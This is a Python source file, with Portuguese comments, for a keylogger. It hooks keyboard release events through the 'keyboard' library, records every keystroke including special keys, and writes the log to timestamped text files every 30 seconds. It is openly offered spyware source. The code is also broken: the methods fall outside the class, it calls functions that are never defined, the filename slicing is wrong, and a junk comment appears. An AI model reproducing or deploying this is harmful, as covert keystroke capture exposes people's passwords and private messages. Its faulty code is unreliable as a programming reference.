#pip install keyboard 
#comando utilizado para instalação da biblioteca de teclado para ler o que está sendo digitado, registrar teclas, etc

#Lista do que vai ser executado:
#1- Fazer o set de quais teclas estão sendo executadas
#2- Quando alguma tecla for usada gerar uma string responsavel por armazenar 
#3- Registrar um arquivo para receber as informações
#|-----------------------------------------------------------------------------------------------------------------------------|
#codigo interpretado e modificado por mim

import keyboard
from threading import Timer
from datetime import datetime


SEND_REPORT_EVERY = 30  
class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.detector = datetime.now()
        self.detectorenc = datetime.now()
def callback(self, event):
    name = event.name
    if len(name) > 1: #interpretar caracteres especiais (ctrl, shift)
        if name == "space":
            name =  " "
        elif name == "enter": #pular linha quando enter for apertado
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else: #utilizar underline para separação
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
    self.log += name #self.log vai receber ele + a variavel name

def enviar_arquivo(self):
    detector = str(self.detector)[-7].replace(" ", "-").replace(":" , " ") #definindo os espaços para o nome do arquivo
    detectorenc = str(self.detectorenc)[:-7].replace(" ", "-").replace(":", "") #encerrar detector
    self.filename = f"keylog-{detector}_{detectorenc}"
def inserir_no_arquivo(self):
    with open(f"{self.filename}.txt", "w") as f: #abrir e gerar um arquivo em modo de escrita
        print(self.log, file=f)
    print(f"[+]Salvo {self.filename}.txt")

def report(self):
    if self.log: #se o arquivo receber algo, constar
        detectorenc = datetime.now()
        self.update_filename()
    elif self.report_method == "file":
        self.report_to_file()
    print(f"[{self.filename}] - {self.log}") #nao reportar no terminal
    self.detector = datetime.now()
    self.log = ""
    timer = timer(interval = self.interval, function=self.report)
    timer.daemon = True
    timer.start()
    
    #ddadasdasdasdas
def start(self):
    self.detector = datetime.now()
     #começar o keylogger
    keyboard.on_release(callback=self.callback)
    #começar a puxar teclas
    self.report()
    print(f"{datetime.now()} - Iniciado")
    keyboard.wait()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
            
        